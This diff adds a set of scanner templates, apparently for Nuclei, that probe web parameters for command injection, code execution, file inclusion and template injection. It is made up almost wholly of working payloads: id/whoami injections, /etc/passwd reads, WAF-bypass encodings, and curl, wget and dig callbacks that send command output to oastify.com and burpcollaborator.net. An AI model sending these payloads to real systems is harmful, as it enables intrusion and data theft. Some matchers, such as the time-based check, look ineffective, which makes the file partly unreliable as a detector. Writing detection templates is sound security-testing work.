@@ -1,0 +1,278 @@
+id: basic-command-injection
+info:
+  name: Basic Command Injection
+  author: AniipID
+  severity: critical
+  description: Detects basic OS command injection via semicolon/pipeline
+  tags: rce,command-injection,oast
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=;id;"
+      - "{{BaseURL}}?q=|id|"
+      - "{{BaseURL}}?q=`id`"
+      - "{{BaseURL}}?q=$(id)"
+    matchers:
+      - type: regex
+        regex:
+          - "uid=\\d+\\(\\w+\\)"
+          - "gid=\\d+\\(\\w+\\)"
+        name: "command-injection-confirmed"
+---
+id: time-based-blind-rce
+info:
+  name: Time-Based Blind RCE
+  author: AniipID
+  severity: critical
+  description: Detects blind command injection via time delay
+  tags: rce,blind,time-based
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=;sleep(5);"
+      - "{{BaseURL}}?q=|sleep(5)|"
+      - "{{BaseURL}}?q=`sleep(5)`"
+    matchers:
+      - type: word
+        words:
+          - "elapsed"
+        condition: or
+        name: "time-based-rce"
+---
+id: outbound-oob-rce
+info:
+  name: OOB Command Injection
+  author: AniipID
+  severity: critical
+  description: Detects out-of-band command injection via DNS/HTTP callback
+  tags: rce,oob,dns
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=;curl%20http://oastify.com/$(id);"
+      - "{{BaseURL}}?q=;wget%20http://oastify.com/$(id);"
+      - "{{BaseURL}}?q=;nslookup%20$(id).oastify.com;"
+    matchers:
+      - type: word
+        words:
+          - "curl"
+        name: "oob-callback-triggered"
+---
+id: php-rce
+info:
+  name: PHP Code Execution
+  author: AniipID
+  severity: critical
+  description: Detects PHP code execution via system/passthru/eval
+  tags: rce,php
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=;system('id');"
+      - "{{BaseURL}}?q=;passthru('id');"
+      - "{{BaseURL}}?q=;echo%20shell_exec('id');"
+      - "{{BaseURL}}?q={{base64_decode('aWQ=')}}"
+    matchers:
+      - type: regex
+        regex:
+          - "uid=\\d+"
+          - "www-data"
+          - "root"
+        name: "php-rce-confirmed"
+---
+id: python-rce
+info:
+  name: Python Code Execution
+  author: AniipID
+  severity: critical
+  description: Detects Python code execution via eval/exec/subprocess
+  tags: rce,python
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=;python%20-c%20'import%20os;print(os.popen(%22id%22).read())';"
+      - "{{BaseURL}}?q=;python3%20-c%20'import%20os;print(os.popen(%22id%22).read())';"
+    matchers:
+      - type: regex
+        regex:
+          - "uid=\\d+"
+        name: "python-rce-confirmed"
+---
+id: lfi-rce
+info:
+  name: Local File Inclusion to RCE
+  author: AniipID
+  severity: critical
+  description: Detects LFI that can lead to RCE via log poisoning /proc/self
+  tags: rce,lfi
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?file=../../../etc/passwd"
+      - "{{BaseURL}}?file=/etc/passwd"
+      - "{{BaseURL}}?page=../../../etc/passwd"
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          - "bin:.*:1:1:"
+        name: "lfi-confirmed"
+---
+id: windows-rce
+info:
+  name: Windows Command Injection
+  author: AniipID
+  severity: critical
+  description: Detects command injection on Windows targets
+  tags: rce,windows
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=%26%20whoami%20%26"
+      - "{{BaseURL}}?q=|%20whoami%20|"
+      - "{{BaseURL}}?q=;%20whoami;"
+    matchers:
+      - type: word
+        words:
+          - "nt authority"
+          - "admin"
+          - "user"
+        condition: or
+        name: "windows-rce"
+---
+id: nodejs-rce
+info:
+  name: Node.js Code Execution
+  author: AniipID
+  severity: critical
+  description: Detects Node.js code execution via eval
+  tags: rce,nodejs
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=;node%20-e%20'console.log(require(%22child_process%22).execSync(%22id%22).toString())';"
+      - "{{BaseURL}}?q=;process.mainModule.require('child_process').execSync('id');"
+    matchers:
+      - type: regex
+        regex:
+          - "uid=\\d+"
+        name: "nodejs-rce"
+---
+id: ruby-rce
+info:
+  name: Ruby Code Execution
+  author: AniipID
+  severity: critical
+  description: Detects Ruby code execution via eval/exec
+  tags: rce,ruby
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=;ruby%20-e%20'puts%20`id`';"
+      - "{{BaseURL}}?q=;eval(%27puts%20`id`%27);"
+    matchers:
+      - type: regex
+        regex:
+          - "uid=\\d+"
+        name: "ruby-rce"
+---
+id: perl-rce
+info:
+  name: Perl Command Injection
+  author: AniipID
+  severity: critical
+  description: Detects Perl command injection via backtick
+  tags: rce,perl
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=;perl%20-e%20'print%20`id`';"
+    matchers:
+      - type: regex
+        regex:
+          - "uid=\\d+"
+        name: "perl-rce"
+---
+id: blind-oast-rce
+info:
+  name: Blind OOB-RCE (curl/dig)
+  author: AniipID
+  severity: critical
+  description: Detects blind RCE via OOB callback techniques
+  tags: rce,oob,blind
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=;ping%20-c%201%20$(whoami).burpcollaborator.net;"
+      - "{{BaseURL}}?q=;curl%20http://$(whoami).burpcollaborator.net;"
+      - "{{BaseURL}}?q=;dig%20$(whoami).burpcollaborator.net;"
+    matchers:
+      - type: word
+        words:
+          - "burpcollaborator"
+          - "oastify"
+        condition: or
+        name: "blind-oast-triggered"
+---
+id: encoded-command-bypass
+info:
+  name: Encoded Command Injection (WAF Bypass)
+  author: AniipID
+  severity: critical
+  description: Detects command injection using encoding/obfuscation to bypass WAF
+  tags: rce,waf-bypass,encoded
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=;echo%20%24%28%69%64%29;"
+      - "{{BaseURL}}?q=;%65%63%68%6f%20%24%28%69%64%29;"
+      - "{{BaseURL}}?q=;e%63ho%20$(id);"
+    matchers:
+      - type: regex
+        regex:
+          - "uid=\\d+"
+        name: "encoded-rce"
+---
+id: ssti-rce
+info:
+  name: Server-Side Template Injection RCE
+  author: AniipID
+  severity: critical
+  description: Detects SSTI leading to RCE via template engines
+  tags: rce,ssti
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?name={{7*7}}"
+      - "{{BaseURL}}?name=${7*7}"
+      - "{{BaseURL}}?name=<%=%207*7%20%>"
+    matchers:
+      - type: word
+        words:
+          - "49"
+        name: "ssti-math-confirmed"
+---
+id: internal-network-ping
+info:
+  name: Internal Network Discovery via RCE
+  author: AniipID
+  severity: high
+  description: Detects command injection with network reconnaissance capability
+  tags: rce,internal,discovery
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=;cat%20/etc/hosts;"
+      - "{{BaseURL}}?q=;ifconfig;"
+      - "{{BaseURL}}?q=;ip%20addr;"
+    matchers:
+      - type: regex
+        regex:
+          - "127\\.0\\.0\\.1"
+          - "192\\.168\\."
+          - "10\\."
+          - "172\\.1[6-9]\\."
+          - "172\\.2[0-9]\\."
+          - "172\\.3[0-1]\\."
+        condition: or
+        name: "internal-ip-leaked"
